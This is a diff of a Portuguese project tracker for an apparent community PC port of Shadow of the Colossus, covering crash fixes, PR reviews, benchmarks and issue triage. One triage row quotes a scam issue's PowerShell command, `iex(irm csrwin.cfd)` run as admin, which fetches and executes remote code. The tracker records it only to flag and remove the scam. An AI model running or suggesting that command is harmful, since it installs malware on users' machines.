@@ -29,7 +29,7 @@ fiz no branch `sotc` ficam de fora quando a comunidade já as tem (e testou em h
 | 0.17 | #147: texturas aparecendo atrasadas e luz piscando na 0.58.1 (NVIDIA) | 🔍 | Log sem erro. Suspeita: liberação de memória fria (um bloco que volta passa um quadro zerado) e a limpeza de texturas a 60%. Pedir teste com **Uso de memória de vídeo = Máximo** (desliga a liberação). |
 | 0.18 | #149 / #91: modo PS4 Pro derruba o jogo (ao carregar save) | ✅ | `8ee28b2`. Dois logs de queda do usuário (19/10, modo Pro): o alocador do próprio jogo procura um bloco livre num mapa de bits de 64 KiB que cobre a memória direta (5696 MiB no Pro); cheio, lê fora do mapa (offset 0x1a371, leitura de -1). Agora o modo Pro recebe 9152 MiB, como as resoluções largas. Demo no Pro: 150 s, média 64,3, sem falha. Falta confirmar na AMD (#149). |
 | 0.19 | #141/#148: tela/quadrados pretos piscando com FSR 3 na AMD (RX 7800 XT) | 🔍 AMD | Some ao desligar a geração de quadros. O fork do nakaionyt (origem do FSR 3) não tem correção mais nova. Precisa de placa AMD para testar. |
-| 0.20 | #146: queda nas cenas finais depois do Malus | ✅ **zerável** | 20/10: o usuário jogou do save "15 derrotados" até os créditos (texturas HQ, modo Pro, 60 FPS) com a PR #191. Caiu só no carregamento pós-créditos (`0x49500`, heap h7): a guarda BPE pegava a faixa dos heaps em [heap+0x28] (ponteiro comum a todos; +0x30 = bytes em uso). `2bed92e`: heaps do mundo protegidos pela faixa dos próprios blocos livres (FreeExtent). Teste do save pós-jogo "Todos os colossos derrotados - Normal+(1)" pendente. |
+| 0.20 | #146: queda nas cenas finais depois do Malus | ✅ **zerável** | 20/10: o usuário jogou do save "15 derrotados" até os créditos (texturas HQ, modo Pro, 60 FPS) com a PR #191. Caiu só no carregamento pós-créditos (`0x49500`, heap h7): a guarda BPE pegava a faixa dos heaps em [heap+0x28] (ponteiro comum a todos; +0x30 = bytes em uso). `2bed92e`: heaps do mundo protegidos pela faixa dos próprios blocos livres (FreeExtent). Save pós-jogo "Todos os colossos derrotados - Normal+(1)" carregado e jogado até o 2º colosso sem queda (20/10). |
 | 0.21 | #95: som baixo | ✅ | `c102242`. Opção **Volume** (Configurações > Som): 100/150/200/300%, com suavização dos picos acima de 100% (`SOTC_VOLUME`). Medido gravando o som do demo: 200% dobra o nível exato (pico 0,23 → 0,46); o jogo usa menos de 1/4 da escala, então 300% quase não precisa suavizar. |
 | 0.22 | #136: atualização automática no lançador | ✅ | `8f91784`, do Oussama268 (2a560cd), apontando para o nosso GitHub. Procura ao abrir (opção) e pelo link "Procurar atualização"; pergunta antes de baixar, confere tamanho/SHA-256/estrutura do zip, mantém user/, update/ e sotc.ini, desfaz se der erro. 9 testes dele passam; o exe compilado consulta o GitHub e responde "em dia (0.58.1)". Instalação de verdade só dá para ver quando sair a 0.59. |
 | 0.23 | **Publicar v0.59** | ✅ | Thread de desenhos do Oussama, F11, ultrawide+Pro, memória de vídeo, volume, atualização automática, #151, #137, #146 (em teste). |
@@ -52,6 +52,47 @@ fiz no branch `sotc` ficam de fora quando a comunidade já as tem (e testou em h
 | 0.39 | **Publicar v0.60.2** | ✅ | |
 | 0.40 | PR #196 (Lucas): janela de 64 KiB nas leituras da GPU | ✅ | +2,7% no templo (medido por ele). |
 | 0.41 | **Publicar v0.60.3** ("zerável do início ao fim") | ✅ | |
+| 0.42 | Blocos ciano em pedras entalhadas e flores piscando com texturas HQ (foto do usuário, final do jogo) | ✅ | `212d7e6`. A troca de mip da PR #191 oscilava (4,3,2,3,2) com um limiar só; histerese: grosso abaixo de 8% (2 níveis abaixo de 3%), fino só acima de 6%/16%. Usuário jogou do Novo Jogo+ ao 2º colosso: 3 trocas (4→3→2), sem blocos, sem flores piscando, sem quedas. Save pós-jogo carregou: queda pós-créditos confirmada como corrigida. |
+| 0.43 | **Publicar v0.60.4** | ✅ | Comentado na PR #191 para o Lucas. |
+| 0.44 | Revisão de código v0.59..HEAD (8 achados) | ✅ 7 de 8 | `2c5d112` (local, sem push). Teste de 10 min com a configuração completa (HQ, Pro, 9152 MiB, 60 FPS): 0 quedas, média 53,5 / mínima 28,1 (igual a antes); dump de pilhas disparado no meio do jogo (76 threads) sem travar. Corrigidos: cerca do heap limitada à cauda de 1 MiB (pulava a guarda nas peças seguintes do heap do mundo); faixa do heap do mundo refeita após 250 ms quando uma leitura cai fora dela; dump de pilhas do vigia só lê com a thread pausada e imprime depois (não trava em lock do CRT/loader); tamanho da memória direta informado só depois do fallback; botão 60 FPS do menu não troca mais "Ilimitado" por "60"; tela de loading translúcida em engasgos curtos, opaca após 3 s; fins de linha de `emit_spirv_atomic.cpp` restaurados. Gatilho de LOD da PR #191: medido com ele desligado (Pro, 9152 MiB, 5 min): o pool de 146416 páginas fica com 0–15 livres por minutos, sem queda; o alocador do jogo libera páginas antes (call 0x1abf0) e só cai quando nada pôde ser liberado. Nenhum limiar de páginas livres separa normal de perigo → mantido até reproduzir a queda (espada no sol, Santuário, modo Pro) e detectar a liberação que falha. Log agora mostra páginas absolutas. |
+| 0.45 | Vigia de travamento (pilhas no log após 15 s sem quadro) e diagnósticos `SOTC_LOD_POOL_LOG` / `SOTC_PEEK` | ✅ | `395db90`, `41cd78a` (locais). Mais de 2 h de benchmark sem reproduzir o "fechou do nada"; o vigia vai pegar a próxima no PC de um jogador. |
+| 0.46 | Texturas "Máxima" nítidas sem queda | ⏳ | Precisa reproduzir a queda (espada no sol no Santuário, modo Pro) com o gatilho desligado e `SOTC_LOD_POOL_LOG=1`; depois detectar a liberação de páginas que falha (0x1abf0) em vez de olhar páginas livres. |
+| 0.47 | GTX 1080 (live): texturas arco-íris e vértices explodindo | 🔍 | Não reproduz aqui forçando o caminho da #169. Pedir ao streamer: `SOTC_BARYCENTRIC_GS=0`, `SOTC_RB_NARROW=0`, `SOTC_LOD_POOL_LOW=0`, um por vez. |
+| 0.48 | Retângulo cinza no céu (foto do usuário) | ⏳ | |
+| 0.49 | **Publicar v0.60.5** | ✅ | Revisão + vigia, PRs #219, #232, #215, #205, #198, #207, #212, seletor de texturas. Notas e README com o menu F1 (imagem), atalhos F1/F7/F8/F10/F11 e os níveis de textura com os problemas possíveis. |
+
+## Triagem de 21/10 (12 PRs e 103 issues abertas)
+
+**PRs novas**
+
+| # | Item | Estado | Notas |
+|---|---|---|---|
+| T1 | PR #219 (Oussama268): vazamento de memória, ~60 MB/min | ✅ `c9be814` | 10 min com a configuração completa: memória privada sobe na carga (4,5 → 5,8 GB nos 4 primeiros min, áreas do demo) e depois fica em 5,7–6,0 GB nos 6 min seguintes; 0 quedas, média 56,6 / mínima 35,6. `final_suspend` é `suspend_always`, então o `destroy()` é necessário e seguro. 7 linhas: os quadros das corrotinas de buffers indiretos nunca eram liberados (756 → 1706 MiB em 15 min; >7 GB em meia hora). Provável parte de #220 (6 GB, memória sobe até cair), dos engasgos em sessões longas e talvez do "fechou do nada". |
+| T2 | PR #232 (Tadomikaari312-Hy): reaproveitar binds de descritores entre draws iguais | ✅ `9f009e8` | Demo 5 min, configuração completa sem limite de FPS: **ligado 75,2 / 41,7, desligado 72,8 / 37,1** (+3,3% média, +12% mínima); 46% dos draws reaproveitam. Folhas de imagens do demo iguais quadro a quadro, sem artefatos. Invalidação: compute, troca de render target, realocação, volta do anel de stream. Santuário RX 6600M: 24–25 → 29,6–30 FPS. `SOTC_FAST_BIND=0` desliga. Medir aqui na NVIDIA e procurar artefatos. |
+| T3 | PR #205 (Lucas): barreiras LDS na AMD GCN (wave64) | ✅ `0b7a195` (teste em GCN pelos jogadores) | Só liga em AMD com subgroup 64 (`SOTC_AMD64_LDS=0` desliga); na NVIDIA a linha nem aparece no log. Causa provável dos personagens brancos/verdes/rosa na RX 470–590/Vega (0.28; #152, #158, #162, #187, #201): `needs_lds_barriers` ficava falso com subgroup 64. Sem efeito na NVIDIA; teste em GCN pelos jogadores. |
+| T4 | PR #198 (Lucas): CPUs com 4 threads (gravador dorme, CP cede) | ✅ `753ca1a` | Aqui (32 processadores lógicos) o gravador segue igual (spin 250 us); a pausa do CP: ligada 73,4 / 41,1, desligada 74,6 / 40,1 = dentro do ruído. Ganho de 4 threads medido pelo Lucas (não simulado aqui). 4 threads: preso no loading → 73 FPS. Conferir que não perde FPS em 16 threads. |
+| T5 | PR #215 (Oussama268): pré-carga de pipelines nos workers (driver novo: 107 s → 6,5 s) | ✅ `5bfee23` | Driver novo simulado (cache de disco da NVIDIA numa pasta vazia, `__GL_SHADER_DISK_CACHE_PATH`): **tela de carregamento 106,4 s → 7,0 s**; com cache normal 1,6 s e demo 77,5 / 36,8 sem limite. Sem queda do driver NVIDIA (a pré-carga antiga, `e8e304f`, derrubava). `SOTC_ASYNC_PRELOAD=0` volta ao modo antigo. A pré-carga assíncrona anterior derrubou o driver NVIDIA aqui (0.10/0.25). Testar com cache apagado do driver. |
+| T6 | PR #207 (Lucas): lançador sobrevive a stdout que recusa escrita (#104) | ✅ `f2163cf` | Pequena, 26 linhas. |
+| T7 | PR #212 (Oussama268): mensagem clara para dump/módulos ainda criptografados | ✅ `a237121` | 6 testes do prepare passam. Etapa 2 (T3+T6+T7): demo 5 min com a configuração completa, média 56,4 / mínima 36,9, 0 quedas. |
+| T8 | PR #173 (JihedMrouki): baricêntricas por geometry shader na GTX 10xx | ❎ provável duplicata | Já temos a emulação por GS (log: "emulated by a geometry shader", via #169). Conflita. Comparar só as correções extras (sombra distante na 1080 Ti) antes de fechar. |
+| T9 | PRs antigas #93, #81, #69, #39 | ⏳ decisão | #93 e #81 já integradas em partes (fechar com aprovação); #69 decisão pendente (0.5); #39 Linux (AppImage) atualizada há 13 h. |
+
+**Issues novas / importantes**
+
+| # | Item | Estado | Notas |
+|---|---|---|---|
+| T10 | #235: texturas HD pioraram na 0.60.4 em relação à 0.60.3 (com fotos) | ✅ `f5cc9e3` seletor de 3 níveis | Escolha do usuário: **Desligada / Alta (estável) / Máxima (nítida)** no lançador e no menu do jogo (muda na hora). Alta = gatilho mantido; Máxima = `SOTC_LOD_POOL_LOW=0`. Caixa antiga migra para Alta/Desligada (testado nos 4 casos). Demo 5 min, Pro, 9152 MiB: Alta 57,2 / 40,8, 2 trocas e termina no mip 3; Máxima 56,9 / 37,3, sempre mip 2, 0 quedas; ponte e pedras visivelmente mais nítidas na Máxima. Análise anterior: É a histerese da 0.42: com o pool sempre em ~0% livre o mip só volta ao fino acima de 16%, então fica preso no mip 4/3. Na 0.60.3 (sem histerese) voltava ao 2 entre as oscilações. Decidir: desligar o gatilho por padrão (nítido, risco da queda 0x1a371) ou corrigi-lo pela liberação que falha (0.46). |
+| T11 | #226: queda na cena final (RTX 5070, log anexado) | 🔍 | Baixar o log (pedir aprovação) e ver se é o 0x49500 já corrigido na 0.60.3 ou outra coisa. |
+| T12 | #228: colosso 5 (Avion) não aparece depois do 4 (modo Difícil, save da 0.59) | 🔍 | Ver se o save passa de versão; pedir o save. |
+| T13 | #202: barra de vida/stamina aparece cheia (fundo preto) em 3440x1440 + Pro | 🔍 | Só no ultrawide; em 16:9 normal. HUD do patch de tela larga (#54). |
+| T14 | #214: sem som na 0.60.4 (RX 6600, log) | 🔍 | Provável módulo de som (libSceNgs2/libSceUlt) faltando; ver o log. |
+| T15 | #208, #209, #210, #227, #206: geração de quadros/FSR na AMD e HUD tremendo | 🔍 | #209 é o **FSR 1 (upscaler)** com artefatos/tearing na RX 9070, sem geração de quadros: diferente das outras. HUD tremendo: `SOTC_FG_HUDLESS=1` (#154) já existe; avaliar ligar por padrão. |
+| T16 | #200, #231, #237 (+ #70, #88, #89, #164–166): CPUs sem AVX2/BMI1/LZCNT/MOVBE | ⏳ pedir PR | O fork do Lucas já troca essas instruções ao carregar (trabalho do Oussama, desde 0.59-plus2); #200 confirmou que funciona. Convidar para PR. |
+| T17 | #224, #199: engasgos de shader mesmo com cache (RX 9060 XT; Intel Arc B580, ~13 s por área nova) | 🔍 | Arc B580: `SOTC_INTEL_PIN_SUBGROUP` não mudou nada. |
+| T18 | #217: texturas quebradas na Intel Arc A580 | 🔍 Intel | Sem hardware. |
+| T19 | #234/#37: HDR | ⏳ ideia | shadPS4 release 19 tem HDR; avaliar portar. |
+| T20 | #213 (Lucas): triagem com 41 issues que podem ser fechadas | ⏳ aprovação | Cada uma já tem comentário dele. Fechar com aprovação do usuário. |
+| T21 | **#233 e #236: golpe (malware)** — `iex(irm csrwin.cfd)` como admin, igual à #138 | 🚨 | Apagar as issues e denunciar as contas (só o dono do repositório pode). |
 
 ## Fase 1 — Estabilidade (quedas e travamentos)
 
@@ -62,7 +103,7 @@ fiz no branch `sotc` ficam de fora quando a comunidade já as tem (e testou em h
 | 3 | Liberar VRAM sem uso (placas de 4–6 GB) | ✅ | Da #103, adaptada aos blocos (0.3). Meu `1b62560` fica de fora: não comparava a arena com a memória do jogo antes de liberar (risco de cenas apagadas, achado do Oussama). |
 | 4 | Fault 0x1a371 no modo PS4 Pro (após 1º/2º colosso) | ✅ | PR #106 (+640 MiB no modo Pro); mesma conclusão que a minha (`c2614b0`/`7d9ee11`). |
 | 4b | Streaming de texturas desligado sem querer desde a v0.0.13 | ✅ | Opção "Texturas em alta qualidade" nos Ajustes rápidos, **ligada por padrão** (`SOTC_LOD_LINGER=1`: os bancos usados desde o último relatório contam como amostrados). Comparação na árvore da abertura: folhas borradas → nítidas. Testes anteriores equivalentes: 10+15 min normal e 7,5 min Pro sem queda; carregar save com ela ligada ainda sem teste automático. |
-| 5 | Queda na intro final | ⏳ | Aguardando log/cena do usuário. |
+| 5 | Queda na intro final | ✅ | Ver 0.20: jogo zerado do início ao fim (20/10). |
 | 6 | Release v0.58 | ✅ | **Publicada em 19/10** (tag `v0.58` = `0ac9252`, SotC-PC.zip 84 MB, Latest). Releases públicas: 0.58, 0.57, 0.56. O rascunho antigo 0.58-rc1 (AMD preview, não público) ficou. |
 
 ## Fase 2 — Modo 60 FPS
@@ -106,7 +147,7 @@ fiz no branch `sotc` ficam de fora quando a comunidade já as tem (e testou em h
 | 20 | Idioma na primeira tela do lançador | ✅ | `8508a33`. Seletor 🌐 no canto da tela de boas-vindas; o lançador reabre no idioma escolhido. |
 | 21 | Imagem de cada save na lista (como no PS4 / shadPS4) | ✅ | O `icon0.png` de cada save à esquerda do título, detalhes e data. |
 
-| 22 | Tela de carregamento e barra de % dos shaders | ✅ | `2eb2f7e`. Aparece quando o jogo passa 1 s sem desenhar (boot, cache de shaders, cargas longas); barra com % enquanto o cache é lido. Com o cache pronto dura ~0,3 s; o preto que vem depois é o próprio jogo carregando os logos. |
+| 22 | Tela de carregamento e barra de % dos shaders | ✅ | `2eb2f7e`. Aparece quando o jogo passa 1 s sem desenhar (boot, cache de shaders, cargas longas); barra com % enquanto o cache é lido. Com o cache pronto dura ~0,3 s; o preto que vem depois é o próprio jogo carregando os logos. Desde 0.44: translúcida em engasgos curtos, opaca só após 3 s sem quadro. |
 
 | 23 | Ícone próprio da janela do jogo (menino com a espada; ou o do jogo, ou imagem do jogador) | ✅ | `83ecb1c`. |
 | 24 | Release v0.58.1 | ✅ | Publicada em 19/10 (texturas em alta qualidade + ícone da janela). Releases públicas: 0.58.1, 0.58, 0.57 (0.56 removida; tag mantida). |
